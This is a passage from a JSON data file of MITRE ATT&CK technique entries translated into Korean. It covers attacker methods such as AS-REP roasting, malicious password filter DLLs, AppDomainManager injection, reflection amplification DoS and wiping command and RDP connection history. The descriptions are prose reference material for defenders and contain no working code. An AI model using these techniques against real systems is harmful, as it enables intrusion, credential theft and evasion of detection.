적대자가 제공한 목록의 항목과 일치하는 경우에만 전송 중인 첨부파일을 복사하여 이후에 유출하기 위해 저장하는 등의 작업을 수행할 수 있습니다.",
    "external_id": "T1505.002",
    "modified": "2021-10-18T17:05:44.321Z",
    "translated": true
  },
  {
    "title": "System Information Discovery",
    "description": "적대자가 운영 체제와 하드웨어에 대한 자세한 정보, 버전, 패치, 핫픽스, 서비스 팩 및 아키텍처 등을 얻으려고 할 수 있다. 적대자는 자동 검색 중에 시스템 정보 발견에서 얻은 정보를 사용하여 후속 행동을 정형화할 수 있으며, 여기에는 적대자가 대상을 완전히 감염시키는지 여부 및 특정 행동을 시도하는지가 포함된다.\n\n`Systeminfo`와 같은 도구를 사용하여 자세한 시스템 정보를 수집할 수 있다. 권한 있는 접근으로 실행할 경우, macOS의 `systemsetup` 구성 도구를 통해 시스템 데이터의 세부 정보를 수집할 수 있다. 예를 들어, 사용자 수준의 접근을 가진 적대자는 현재 마운트된 디스크와 관련된 여유 공간을 얻기 위해 `df -aH` 명령을 실행할 수 있다. 적대자는 또한 네트워크 장치에서 `show version`과 같은 명령을 사용하여 자세한 시스템 정보를 수집할 수 있다. 시스템 정보 발견은 다른 형태의 검색 및 정찰에서 수집된 정보와 결합되어 페이로드 개발 및 은폐를 유도할 수 있다.\n\nAWS, GCP 및 Azure와 같은 인프라 서비스(IaaS) 클라우드 제공자는 API를 통해 인스턴스 및 가상 기계 정보에 대한 접근을 허용한다. 성공적인 인증 API 호출은 특정 인스턴스의 운영 체제 플랫폼 및 상태 또는 가상 기계의 모델 뷰와 같은 데이터를 반환할 수 있다.",
    "external_id": "T1082",
    "modified": "2024-10-15T16:42:22.247Z",
    "translated": true
  },
  {
    "title": "Application Layer Protocol",
    "description": "적대자는 OSI 애플리케이션 계층 프로토콜을 사용하여 기존 트래픽과 혼합함으로써 탐지나 네트워크 필터링을 피할 수 있습니다. 원격 시스템에 대한 명령과 종종 해당 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 내장됩니다.\n\n적대자는 웹 브라우징, 파일 전송, 전자 메일, DNS 또는 게시/구독에 사용되는 다양한 프로토콜을 활용할 수 있습니다. 내부 연결(프록시 또는 피봇 노드와 다른 노드 간의 연결)에서는 일반적으로 사용되는 프로토콜로 SMB, SSH 또는 RDP가 있습니다.",
    "external_id": "T1071",
    "modified": "2024-08-28T14:10:33.145Z",
    "translated": true
  },
  {
    "title": "AppDomainManager",
    "description": "적대적인 자들은 .NET `AppDomainManager`가 어셈블리를 로드하는 방식을 탈취하여 자체 악성 페이로드를 실행할 수 있습니다. .NET 프레임워크는 `AppDomainManager` 클래스를 사용하여 프로세스 내에서 .NET 응용 프로그램의 실행을 호스팅하기 위해 하나 이상의 격리된 런타임 환경(응용 프로그램 도메인이라고 함)을 생성하고 관리합니다. 어셈블리(`.exe` 또는 `.dll` 바이너리)는 실행 가능한 코드로서 응용 프로그램 도메인으로 로드될 수 있습니다.\n\n\"AppDomainManager 주입\"이라고 알려진 이 기법을 통해, 적대적인 자들은 .NET 응용 프로그램이 어셈블리를 로드하는 방식을 탈취하여 임의의 코드를 실행할 수 있습니다. 예를 들어, 악성 소프트웨어는 타겟 프로세스 내에 사용자 지정 응용 프로그램 도메인을 생성하여 임의의 어셈블리를 로드하고 실행할 수 있습니다. 또는 .NET 런타임 설정을 정의하는 구성 파일(`.config`)이나 프로세스 환경 변수를 변조하여 그렇지 않게 무해한 .NET 응용 프로그램이 타겟 프로세스에 악성 어셈블리(이름으로 식별됨)를 로드하도록 지시할 수 있습니다.",
    "external_id": "T1574.014",
    "modified": "2024-04-28T15:44:25.342Z",
    "translated": true
  },
  {
    "title": "Remote Data Staging",
    "description": "적대자는 여러 시스템에서 수집한 데이터를 중앙 위치 또는 하나의 시스템의 디렉토리에 배치한 후에 데이터 유출을 수행할 수 있습니다. 데이터는 별도의 파일로 유지되거나 통합된 파일로 결합될 수 있습니다. 인터랙티브한 명령 셸이 사용될 수 있으며, 일반적인 기능을 사용하여 데이터를 스테이징 위치로 복사할 수 있습니다.\n\n클라우드 환경에서는 적대자가 데이터 유출 전에 특정 인스턴스나 가상 머신 내에 데이터를 스테이징할 수 있습니다. 적대자는 해당 인스턴스를 생성하고 그 인스턴스에 데이터를 스테이징할 수 있습니다.\n\n하나의 시스템에서 데이터 유출 전에 데이터를 스테이징함으로써, 적대자는 C2 서버에 연결되는 횟수를 최소화하고 탐지를 피할 수 있습니다.",
    "external_id": "T1074.002",
    "modified": "2024-09-30T13:28:37.414Z",
    "translated": true
  },
  {
    "title": "Additional Container Cluster Roles",
    "description": "공격자는 사용자 또는 서비스 계정에 추가 역할이나 권한을 추가하여 컨테이너 오케스트레이션 시스템에 대한 지속적인 접근을 유지할 수 있습니다. 예를 들어, 충분한 권한을 가진 공격자는 Kubernetes 계정에 Role 또는 ClusterRole을 바인딩하는 RoleBinding 또는 ClusterRoleBinding을 생성할 수 있습니다. 속성 기반 접근 제어(ABAC)가 사용되는 경우, 충분한 권한을 가진 공격자는 Kubernetes ABAC 정책을 수정하여 대상 계정에 추가 권한을 부여할 수 있습니다.\n\n이 계정 수정은 [계정 생성] 또는 기타 악의적인 계정 활동 직후에 이루어질 수 있습니다. 공격자는 또한 자신이 침해한 기존의 [유효한 계정]을 수정할 수 있습니다.\n\n컨테이너 오케스트레이션 시스템이 Google Kubernetes Engine, Amazon Elastic Kubernetes Service, Azure Kubernetes Service와 같은 클라우드 환경에 배포되는 경우, 클라우드 기반 역할 기반 접근 제어(RBAC) 할당이나 ABAC 정책이 종종 로컬 권한 할당 대신 또는 추가로 사용될 수 있다는 점에 유의해야 합니다. 이러한 경우, 이 기법은 [추가 클라우드 역할]과 함께 사용될 수 있습니다.",
    "external_id": "T1098.006",
    "modified": "2023-10-16T17:51:35.865Z",
    "translated": true
  },
  {
    "title": "Scheduled Task/Job",
    "description": "적대자는 작업 예약 기능을 악용하여 악성 코드를 초기 실행하거나 반복적으로 실행하는 것을 용이하게 할 수 있습니다. 모든 주요 운영 체제에는 지정된 날짜와 시간에 프로그램이나 스크립트를 실행하도록 예약할 수 있는 유틸리티가 존재합니다. 적절한 인증 조건이 충족되면 원격 시스템에서도 작업을 예약할 수 있습니다. 원격 시스템에 작업을 예약하려면 일반적으로 해당 원격 시스템에서 관리자 또는 권한이 부여된 그룹의 구성원이어야 할 수 있습니다.\n\n적대자는 작업 예약을 사용하여 시스템 시작 시 또는 정기적으로 프로그램을 실행하여 지속성을 유지할 수 있습니다. 이러한 메커니즘은 또한 특정 계정(예: 권한이 상승된 계정)의 맥락에서 프로세스를 실행하는 데 악용될 수 있습니다. 시스템 이진 프록시 실행과 유사하게, 적대자들은 신뢰할 수 있는 시스템 프로세스에서 일회성 실행을 숨기기 위해 작업 예약을 악용하기도 했습니다.",
    "external_id": "T1053",
    "modified": "2024-10-15T15:14:03.453Z",
    "translated": true
  },
  {
    "title": "Msiexec",
    "description": "적대자는 msiexec.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. Msiexec.exe는 Windows Installer의 명령줄 유틸리티로, 설치 패키지(.msi)를 실행하는 것과 일반적으로 연관되어 있습니다. Msiexec.exe 바이너리는 Microsoft에 의해 디지털 서명될 수도 있습니다.\n\n적대자는 msiexec.exe를 사용하여 로컬 또는 네트워크 접근이 가능한 MSI 파일을 실행할 수 있습니다. Msiexec.exe는 DLL도 실행할 수 있습니다. Windows 시스템에서 서명되었으며 기본적으로 존재하기 때문에 msiexec.exe는 그 잠재적인 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회하는 데 사용할 수 있습니다. 또한 <code>AlwaysInstallElevated</code> 정책이 활성화된 경우 msiexec.exe 실행이 SYSTEM 권한으로 상승될 수 있습니다.",
    "external_id": "T1218.007",
    "modified": "2022-04-19T17:33:16.346Z",
    "translated": true
  },
  {
    "title": "Network Trust Dependencies",
    "description": "적대자는 목표의 네트워크 신뢰 의존성에 대한 정보를 수집할 수 있으며, 이는 타겟팅 과정에서 사용될 수 있습니다. 네트워크 신뢰에 대한 정보에는 제2자 또는 제3자 조직/도메인(예: 관리 서비스 제공업체, 계약자 등)이 포함될 수 있으며, 이들은 연결되어 있고 잠재적으로 상승된 네트워크 접근 권한을 가지고 있을 수 있습니다.\n\n적대자는 이러한 정보를 다양한 방법으로 수집할 수 있으며, 정보 유출을 통한 직접적인 유도 방식이 있습니다. 네트워크 신뢰에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있습니다; 예를 들어, 능동 스캐닝이나 공개 웹사이트/도메인 검색 등이 가능합니다. 이를 통해 운영 자원을 구축하거나(예: 인프라 획득 또는 인프라 침해) 초기 접근을 시도할 수 있습니다.",
    "external_id": "T1590.003",
    "modified": "2021-04-15T03:34:22.917Z",
    "translated": true
  },
  {
    "title": "Reflection Amplification",
    "description": "적대자는 목표에 대해 높은 양의 네트워크 트래픽을 반사시켜 서비스 거부(DoS)를 일으키려 할 수 있습니다. 이러한 유형의 네트워크 DoS는 주어진 스푸핑된 출발 IP 주소에 응답하는 제3자 서버 중개자를 이용합니다. 이 제3자 서버를 일반적으로 반사기(reflector)라고 합니다. 적대자는 피해자의 스푸핑된 주소로 반사기에 패킷을 보내어 반사 공격을 수행합니다. 직접적인 네트워크 홍수와 비슷하게, 여러 시스템이 공격을 수행하는 데 사용되거나 봇넷이 사용될 수 있습니다. 마찬가지로, 하나 이상의 반사기를 사용하여 목표에 트래픽을 집중시킬 수 있습니다. 이 네트워크 DoS 공격은 목표 시스템과 네트워크의 가용성과 기능을 저하시킬 수도 있습니다.\n\n반사 공격은 종종 요청보다 응답이 더 큰 프로토콜을 이용하여 트래픽을 증폭하는 데 유리하며, 이를 반사 증폭 공격(Reflection Amplification attack)이라고 합니다. 적대자는 증폭기에 보내는 요청보다 몇 배나 더 많은 공격 트래픽 양을 생성할 수 있습니다. 이러한 증가는 해당 프로토콜, 사용된 기술, 실제로 공격 트래픽의 증폭을 생성하는 증폭 서버와 같은 많은 변수에 따라 달라집니다. 반사 증폭 홍수를 가능하게 한 두 가지 주요 프로토콜은 DNS와 NTP입니다. 특히, memcache 프로토콜은 요청 패킷의 51,200배까지 증폭할 수 있는 강력한 프로토콜로 나타났습니다.",
    "external_id": "T1498.002",
    "modified": "2024-10-15T16:04:34.495Z",
    "translated": true
  },
  {
    "title": "Password Filter DLL",
    "description": "적대자는 인증 과정에 악성 비밀번호 필터 동적 링크 라이브러리(DLL)를 등록하여 사용자가 인증될 때 사용자 자격 증명을 획득할 수 있습니다.\n\nWindows 비밀번호 필터는 도메인 및 로컬 계정 모두에 대한 비밀번호 정책 집행 메커니즘입니다. 필터는 잠재적 비밀번호를 비밀번호 정책에 대해 검증하는 방법을 포함하는 DLL로 구현됩니다. 필터 DLL은 로컬 계정에 대해 로컬 컴퓨터와 도메인 계정에 대해 도메인 컨트롤러에 위치할 수 있습니다. 로컬 보안 권한(LSA)은 보안 계정 관리자(SAM)에 새로운 비밀번호를 등록하기 전에 등록된 각 필터로부터 검증 요청을 합니다. 모든 등록된 필터가 검증을 수락하기 전까지는 잠재적인 변경 사항이 적용될 수 없습니다.\n\n적대자는 악성 비밀번호 필터를 등록하여 로컬 컴퓨터 및/또는 전체 도메인에서 자격 증명을 수집할 수 있습니다. 올바른 검증을 수행하기 위해 필터는 LSA로부터 평문 자격 증명을 받아야 합니다. 악성 비밀번호 필터는 비밀번호 요청이 있을 때마다 이러한 평문 자격 증명을 받게 됩니다.",
    "external_id": "T1556.002",
    "modified": "2024-08-21T16:16:18.271Z",
    "translated": true
  },
  {
    "title": "Terminal Services DLL",
    "description": "적대자들은 터미널 서비스의 구성 요소를 악용하여 시스템에 대한 지속적인 접근을 가능하게 할 수 있습니다. Microsoft의 터미널 서비스는 2022년부터 일부 Windows Server 운영 체제에서 원격 데스크톱 서비스로 이름이 변경되었으며, 호스트에 대한 원격 터미널 연결을 제공합니다. 터미널 서비스는 서버가 RDP를 통해 클라이언트에 전체 인터랙티브 그래픽 사용자 인터페이스를 전송할 수 있게 합니다.\n\n\"일반\" 프로세스로 실행되는 Windows 서비스는 서비스의 DLL 파일을 로드하며, 그 위치는 <code>ServiceDll</code>이라는 레지스트리 항목에 저장됩니다. <code>termsrv.dll</code> 파일은 일반적으로 `%SystemRoot%\\System32\\`에 저장되며, `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`에서 터미널 서비스의 기본 <code>ServiceDll</code> 값입니다.\n\n적대자들은 터미널 서비스 DLL을 수정하거나 교체하여 피해를 입은 호스트에 대한 지속적인 접근을 가능하게 할 수 있습니다. 이 DLL에 대한 수정은 임의의 페이로드를 실행하도록 하거나 (정상적인 <code>termsrv.dll</code> 기능을 보존할 수도 있음) 터미널 서비스의 악용 가능한 기능을 단순히 활성화하기 위해 수행될 수 있습니다. 예를 들어, 적대자는 <code>termsrv.dll</code> 파일을 패치하거나 <code>ServiceDll</code> 값을 수정하여 증가된 RDP 기능을 제공하는 DLL을 지정함으로써 동시 원격 데스크톱 프로토콜 세션과 같은 기능을 활성화할 수 있습니다. 비서버 Windows OS에서는 이 증가된 기능이 적대자가 새로운 RDP 세션이 생성될 때 시스템의 사용자에게 경고하거나 로그아웃하는 터미널 서비스의 프롬프트를 피할 수 있게 할 수도 있습니다.",
    "external_id": "T1505.005",
    "modified": "2024-09-12T19:40:42.810Z",
    "translated": true
  },
  {
    "title": "AppleScript",
    "description": "적대자들은 AppleScript를 악용하여 실행할 수 있습니다. AppleScript는 애플리케이션과 OS의 일부를 제어하기 위해 설계된 macOS 스크립팅 언어로, AppleEvents라는 애플리케이션 간 메시지를 통해 작동합니다. 이러한 AppleEvent 메시지는 독립적으로 전송되거나 AppleScript를 사용하여 쉽게 스크립트될 수 있습니다. 이러한 이벤트는 열린 창을 찾고, 키스트로크를 전송하며, 거의 모든 열린 애플리케이션과 로컬 또는 원격으로 상호작용할 수 있습니다.\n\n스크립트는 명령줄에서 `osascript /path/to/script` 또는 `osascript -e \"script here\"`를 통해 실행할 수 있습니다. 명령줄 외에도 메일 규칙, 캘린더.app 알람, Automator 워크플로 등을 포함하여 다양한 방법으로 스크립트를 실행할 수 있습니다. AppleScript는 스크립트 파일의 시작 부분에 `#!/usr/bin/osascript`를 추가하여 일반 텍스트 셸 스크립트로도 실행될 수 있습니다.\n\nAppleScript는 실행을 위해 `osascript`를 호출할 필요가 없습니다. 그러나 macOS의 Native API인 `NSAppleScript` 또는 `OSAScript`를 사용하여 mach-O 바이너리 내에서 실행될 수 있으며, 이들 둘 다 `/usr/bin/osascript` 명령줄 유틸리티와 독립적으로 코드를 실행합니다.\n\n적대자들은 AppleScript를 악용하여 열린 SSH 연결과 상호작용하거나 원격 머신으로 이동하며 심지어 사용자에게 가짜 대화 상자를 표시하는 등의 다양한 행동을 실행할 수 있습니다. 이러한 이벤트는 원격으로 애플리케이션을 시작할 수는 없지만(로컬에서 시작할 수 있음), 이미 원격에서 실행 중인 애플리케이션과 상호작용할 수 있습니다. macOS 10.10 Yosemite 이상에서는 AppleScript가 Native API를 실행할 수 있는 능력을 가지고 있으며, 이는 그렇지 않으면 mach-O 바이너리 파일 형식으로 컴파일 및 실행해야 합니다. 이 스크립팅 언어는 Python을 통한 역방향 셸과 같은 더 일반적인 기법을 실행하는 데에도 사용될 수 있습니다.",
    "external_id": "T1059.002",
    "modified": "2024-10-15T14:18:20.087Z",
    "translated": true
  },
  {
    "title": "Browser Extensions",
    "description": "적대자는 인터넷 브라우저 확장을 악용하여 피해 시스템에 지속적으로 접근할 수 있습니다. 브라우저 확장 또는 플러그인은 인터넷 브라우저의 기능을 추가하고 여러 측면을 사용자화할 수 있는 작은 프로그램입니다. 이들은 직접 설치하거나 브라우저의 앱 스토어를 통해 설치할 수 있으며, 일반적으로 브라우저가 접근할 수 있는 모든 것에 대한 접근 권한을 가지고 있습니다.\n\n악성 확장은 정 legitimate한 확장으로 위장한 악성 앱 스토어 다운로드, 사회 공학을 통해 또는 이미 시스템을 손상시킨 적대자의 접근을 통해 브라우저에 설치될 수 있습니다. 브라우저 앱 스토어에서 보안이 제한될 수 있어, 악성 확장이 자동화된 스캐너를 쉽게 우회할 수 있습니다. 브라우저에 따라 적대자는 또한 확장의 업데이트 URL을 조작하여 적대자가 제어하는 서버에서 업데이트를 설치하거나 모바일 구성 파일을 조작하여 추가 확장을 조용히 설치할 수 있습니다.\n\nmacOS 11 이전에는 적대자가 명령줄을 통해 <code>profiles</code> 도구를 사용하여 악성 <code>.mobileconfig</code> 파일을 설치함으로써 브라우저 확장을 조용히 설치할 수 있었습니다. macOS 11 이상에서는 <code>profiles</code> 도구를 사용하여 구성 프로필을 설치할 수 없지만, <code>.mobileconfig</code> 파일은 사용자 상호작용을 통해 심을 수 있고 설치할 수 있습니다.\n\n확장이 설치되면, 배경에서 웹사이트를 탐색하고 사용자가 브라우저에 입력하는 모든 정보를 훔치며(자격 증명 포함), 지속성을 위한 원격 접근 트로이 목마(RAT) 설치자로 사용될 수 있습니다.\n\n또한, 악성 Chrome 확장을 통해 지속적인 백도어를 사용하는 봇넷의 사례도 있었습니다. 적대자는 브라우저 확장을 사용하여 브라우저 권한 및 구성 요소, 개인 정보 설정 및 기타 보안 통제를 수정하여 방어 회피를 할 수 있습니다.",
    "external_id": "T1176",
    "modified": "2024-09-12T19:48:15.871Z",
    "translated": true
  },
  {
    "title": "Service Exhaustion Flood",
    "description": "적대자는 서비스 거부(DoS)를 수행하기 위해 시스템이 제공하는 다양한 네트워크 서비스를 목표로 할 수 있습니다. 적대자는 종종 DNS 및 웹 서비스의 가용성을 목표로 하지만, 다른 서비스들도 공격 대상이 될 수 있습니다. 웹 서버 소프트웨어는 다양한 방법으로 공격받을 수 있으며, 그 중 일부는 일반적으로 적용되지만, 다른 일부는 제공되는 서비스의 소프트웨어에 특정합니다.\n\n이런 유형의 공격 중 하나는 간단한 HTTP 플러드로 알려져 있으며, 적대자가 웹 서버에 대량의 HTTP 요청을 전송하여 서버를 압도하고, 그 위에서 실행되는 애플리케이션까지 영향을 미치도록 합니다. 이 플러드는 목표를 달성하기 위해 원시 볼륨에 의존하며, 서비스 제공에 필요한 다양한 자원을 소진시킵니다.\n\n또 다른 변형인 SSL 재협상 공격은 SSL/TLS의 프로토콜 기능을 이용합니다. SSL/TLS 프로토콜 스위트에는 클라이언트와 서버가 이후의 보안 연결에 사용할 암호화 알고리즘에 동의하는 메커니즘이 포함되어 있습니다. SSL 재협상이 활성화되어 있으면 암호화 알고리즘의 재협상을 요청할 수 있습니다. 재협상 공격에서는 적대자가 SSL/TLS 연결을 설정한 후 일련의 재협상 요청을 진행합니다. 암호 재협상에는 계산 사이클에서 의미 있는 비용이 발생하므로, 이를 대량으로 수행하면 서비스의 가용성에 영향을 줄 수 있습니다.",
    "external_id": "T1499.002",
    "modified": "2024-10-15T16:05:48.014Z",
    "translated": true
  },
  {
    "title": "Compromise Hardware Supply Chain",
    "description": "적대자는 최종 소비자가 제품을 수령하기 전 하드웨어 구성 요소를 조작하여 데이터나 시스템에 위협을 가할 수 있습니다. 공급망에서 하드웨어나 펌웨어를 수정함으로써, 적대자는 소비자 네트워크에 탐지하기 어려운 백도어를 삽입할 수 있으며, 이로 인해 시스템에 대한 높은 수준의 통제력을 가질 수 있습니다. 하드웨어 백도어는 서버, 워크스테이션, 네트워크 인프라 또는 주변 기기와 같은 다양한 장치에 삽입될 수 있습니다.",
    "external_id": "T1195.003",
    "modified": "2022-04-28T16:05:10.755Z",
    "translated": true
  },
  {
    "title": "Native API",
    "description": "대적자는 고유 운영 체제 애플리케이션 프로그래밍 인터페이스(API)와 상호 작용하여 행동을 실행할 수 있습니다. 고유 API는 하드웨어/장치, 메모리 및 프로세스와 관련된 저수준 운영 체제 서비스를 호출하는 통제된 수단을 제공합니다. 이러한 고유 API는 시스템 부팅 시(다른 시스템 구성 요소가 아직 초기화되지 않은 경우)와 일상적인 작업 및 요청을 수행할 때 운영 체제에 의해 활용됩니다.\n\n대적자는 이러한 운영 체제 API 기능을 남용하여 행동을 실행할 수 있습니다. 명령 및 스크립트 인터프리터와 유사하게, 고유 API 및 그 계층 인터페이스는 피해 시스템의 다양한 구성 요소와 상호 작용하고 활용하는 메커니즘을 제공합니다.\n\n고유 API 함수(예: NtCreateProcess)는 시스템 호출/syscalls를 통해 직접 호출될 수 있지만, 이러한 기능은 종종 사용자 모드 애플리케이션에서도 인터페이스와 라이브러리를 통해 노출됩니다. 예를 들어, Windows API의 CreateProcess()나 GNU의 fork()와 같은 함수는 프로그램과 스크립트가 다른 프로세스를 시작할 수 있도록 합니다. 이를 통해 API 호출자는 이진 파일을 실행하거나 CLI 명령을 실행하거나 모듈을 로드하는 등의 작업을 수행할 수 있습니다. 다양한 시스템 작업을 위한 수천 개의 유사한 API 함수가 존재하기 때문입니다.\n\nMicrosoft .NET 및 macOS Cocoa와 같은 고급 소프트웨어 프레임워크도 고유 API와 상호 작용할 수 있는 기능을 제공합니다. 이러한 프레임워크는 일반적으로 API 기능에 대한 언어 래퍼/추상화를 제공하며, 코드의 사용 용이성 및 이식성을 위해 설계되었습니다.\n\n대적자는 방어 센서 및 탐지 서명을 우회하기 위해 어셈블리를 사용하여 직접 또는 간접적으로 syscalls를 호출할 수 있습니다. 대적자는 또한 API 모니터링과 관련된 센서 및 방어 도구를 변조하려고 시도할 수 있으며, 예를 들어 모니터링된 기능을 언훅하여 방어 도구를 비활성화하거나 수정하려고 할 수 있습니다.",
    "external_id": "T1106",
    "modified": "2024-09-12T15:25:57.058Z",
    "translated": true
  },
  {
    "title": "Clear Network Connection History and Configurations",
    "description": "적대자는 악성 네트워크 연결의 증거를 지우거나 제거하여 자신의 작전의 흔적을 제거할 수 있습니다. 시스템 및/또는 애플리케이션 로그에는 원격 서비스나 외부 원격 서비스와 같은 네트워크 연결이 필요한 행동에서 생성된 연결 이력을 강조하는 구성 설정 및 다양한 아티팩트가 있을 수 있습니다. 방어자는 이러한 아티팩트를 사용하여 적대자가 생성한 네트워크 연결을 모니터링하거나 분석할 수 있습니다.\n\n네트워크 연결 이력은 여러 위치에 저장될 수 있습니다. 예를 들어, RDP 연결 이력은 Windows 레지스트리 값에 저장될 수 있습니다:\n\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\n\nWindows는 또한 최근 RDP 연결에 대한 정보를 C:\\Users\\%username%\\Documents\\Default.rdp와 같은 파일이나 C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\에 저장할 수 있습니다. 마찬가지로 macOS 및 Linux 호스트는 시스템 로그에 연결 이력을 강조하는 정보를 저장할 수 있습니다(예: /Library/Logs 및/또는 /var/log/에 저장됨).\n\n악성 네트워크 연결은 또한 타사 애플리케이션 또는 네트워크 구성 설정의 변경을 요구할 수 있으며, 방화벽을 비활성화하거나 수정하거나 프록시를 활성화하는 등의 조작을 포함할 수 있습니다. 적대자는 이러한 데이터를 삭제하거나 수정하여 지표를 감추거나 방어 분석을 방해할 수 있습니다.",
    "external_id": "T1070.007",
    "modified": "2023-09-08T18:05:28.311Z",
    "translated": true
  },
  {
    "title": "AS-REP Roasting",
    "description": "대립자는 Kerberos 사전 인증을 비활성화한 계정의 자격 증명을 비밀번호 크래킹을 통해 드러낼 수 있습니다.\n\n사전 인증은 오프라인 비밀번호 크래킹에 대한 보호를 제공합니다. 이를 활성화하면 자원에 대한 접근을 요청하는 사용자가 자신의 비밀번호 해시로 암호화된 타임스탬프가 포함된 인증 서버 요청(AS-REQ) 메시지를 보내면서 도메인 컨트롤러(DC)와의 통신을 시작합니다. DC가 사용자 비밀번호의 해시로 타임스탬프를 성공적으로 복호화할 수 있는 경우에만, 사용자에게 티켓 그랜팅 티켓(TGT)이 포함된 인증 서버 응답(AS-REP) 메시지를 전송합니다. AS-REP 메시지의 일부는 사용자의 비밀번호로 서명됩니다.\n\n사전 인증이 없는 계정을 발견할 경우, 대립자는 암호화된 타임스탬프 없이 AS-REQ 메시지를 보내고 TGT 데이터가 포함된 AS-REP 메시지를 수신할 수 있으며, 이는 RC4와 같은 안전하지 않은 알고리즘으로 암호화되어 있을 수 있습니다. 복구된 암호화 데이터는 오프라인 비밀번호 크래킹 공격에 취약할 수 있으며, 평문 자격 증명을 노출시킬 수 있습니다.\n\n도메인에 등록된 계정은 특수 권한이 있든 없든 관계없이 Windows 도구를 사용하여 LDAP 필터로 사전 인증이 비활성화된 모든 도메인 계정을 나열하는 데 악용될 수 있습니다. 또는 대립자는 각 사용자에 대해 AS-REQ 메시지를 보낼 수 있습니다. DC가 오류 없이 응답하면 해당 계정은 사전 인증이 필요하지 않으며 AS-REP 메시지는 이미 암호화된 데이터를 포함하고 있을 것입니다.\n\n크랙된 해시는 유효한 계정에 대한 액세스를 통해 지속성, 권한 상승 및 수평 이동을 가능하게 할 수 있습니다.",
    "external_id": "T1558.004",
    "modified": "2024-10-15T15:32:07.850Z",
    "translated": true
  },
  {
    "title": "Virtual Private Server",
    "description": "적대자는 목표 설정 중에 사용할 수 있는 제3자 가상 사설 서버(VPS)를 손상시킬 수 있습니다. 다양한 클라우드 서비스 제공업체가 서비스로서 가상 머신/컨테이너를 판매하고 있습니다. 적대자는 제3자 기관이 구매한 VPS를 손상시킬 수 있습니다. VPS를 인프라로 사용하기 위해 손상시키면, 적대자는 자신의 작업을 물리적으로 연결하기 어렵게 만들 수 있습니다.\n\n적대자 생애 주기의 후속 단계인 명령 및 제어에 사용할 VPS를 손상시키는 것은 적대자가 높은 평판의 클라우드 서비스 제공업체와 손상된 제3자와 연관된 신뢰성을 통해 이익을 얻을 수 있게 해줍니다.",
    "external_id": "T1584.003",
    "modified": "2021-10-17T15:59:02.770Z",
    "translated": true
  },
  {
    "title": "AutoHotKey & AutoIT",
    "description": "적대자는 AutoIT 및 AutoHotKey 자동화 스크립트를 사용하여 명령을 실행하고 악의적인 작업을 수행할 수 있습니다. AutoIT 및 AutoHotkey (AHK)는 사용자가 Windows 작업을 자동화할 수 있도록 하는 스크립팅 언어입니다. 이러한 자동화 스크립트는 버튼 클릭, 텍스트 입력, 프로그램 열기 및 닫기 등 다양한 작업을 수행하는 데 사용될 수 있습니다.\n\n적대자는 AHK(`.ahk`) 및 AutoIT(`.au3`) 스크립트를 사용하여 피해자의 시스템에서 악의적인 코드를 실행할 수 있습니다. 예를 들어, 적대자는 AHK를 사용하여 페이로드 및 키로거와 같은 기타 모듈형 악성 코드를 실행한 적이 있습니다. 또한 적대자는 악성 코드가 포함된 사용자 정의 AHK 파일을 피싱 페이로드로 사용하기도 했습니다.\n\n이 스크립트는 독립 실행형 실행 파일(`.exe`)로 컴파일될 수도 있습니다.",
    "external_id": "T1059.010",
    "modified": "2024-04-28T15:58:48.119Z",
    "translated": true
  },
  {
    "title": "Reduce Key Space",
    "description": "적대자는 네트워크를 통해 전송된 데이터를 해독하는 데 필요한 노력을 줄이기 위해 암호화 통신의 암호 strength를 낮출 수 있습니다.\n\n적대자는 손상된 네트워크 장치에서 사용되는 암호화 소프트웨어의 키 크기를 줄여(예: 수백 또는 수천 바이트에서 단 두 바이트로) 암호화 소프트웨어를 약화시킬 수 있습니다. 그 결과, 적대자는 키 없이 보호된 정보를 해독하는 데 필요한 노력을 현저히 줄일 수 있습니다.\n\n적대자는 시스템에 도입된 특별한 명령을 사용하여 키 크기 및 기타 암호화 매개변수를 수정할 수 있습니다. 이를 통해 장치의 구성을 변경합니다.",
    "external_id": "T1600.001",
    "modified": "2020-10-21T22:36:22.369Z",
    "translated": true
  },
  {
    "title": "Clear Command History",
    "description": "시스템 로그를 지우는 것 외에도 공격자는 침해된 계정의 명령 기록을 삭제하여 침입 동안 수행한 작업을 숨길 수 있습니다. 다양한 명령 인터프리터는 사용자가 터미널에서 입력한 명령을 추적하여 사용자가 이전에 수행한 작업을 되짚어 볼 수 있도록 합니다.\n\n리눅스와 macOS에서는 이러한 명령 기록에 몇 가지 방법으로 접근할 수 있습니다. 로그인 중에는 이 명령 기록이 환경 변수에 의해 지정된 파일에 기록됩니다. 사용자가 시스템에서 로그아웃할 때 이 정보는 사용자 홈 디렉토리의 파일에 기록됩니다. 이는 사용자가 다른 세션에서 이전에 사용한 명령으로 돌아갈 수 있는 이점을 제공합니다.\n\n공격자는 명령 기록을 수동으로 지우거나 해당 파일을 삭제하여 로그에서 명령을 삭제할 수 있습니다.\n\n윈도우 호스트에서는 PowerShell이 두 가지 다른 명령 기록 제공자를 가지고 있습니다: 내장 기록과 PSReadLine 모듈이 관리하는 명령 기록. 내장 기록은 현재 세션에서 사용된 명령만 추적하며, 이 명령 기록은 다른 세션에서는 사용할 수 없고 세션이 끝나면 삭제됩니다.\n\nPSReadLine 명령 기록은 모든 PowerShell 세션에서 사용된 명령을 추적하고 이를 파일에 기록합니다. 이 기록 파일은 모든 세션에서 사용할 수 있으며, 세션이 종료되더라도 삭제되지 않기 때문에 과거의 모든 기록을 포함합니다.\n\n공격자는 PowerShell 명령을 실행하여 현재 PowerShell 세션의 전체 명령 기록을 지울 수 있습니다. 그러나 이는 기록 파일을 삭제하거나 지우지 않습니다. 공격자는 또한 기록 파일을 삭제하거나 그 내용을 수정하여 자신이 실행한 PowerShell 명령을 숨길 수 있습니다.",
    "external_id": "T1070.003",
    "modified": "2024-02-14T20:07:44.756Z",
    "translated": true
  },
  {
    "title": "Indirect Command Execution",
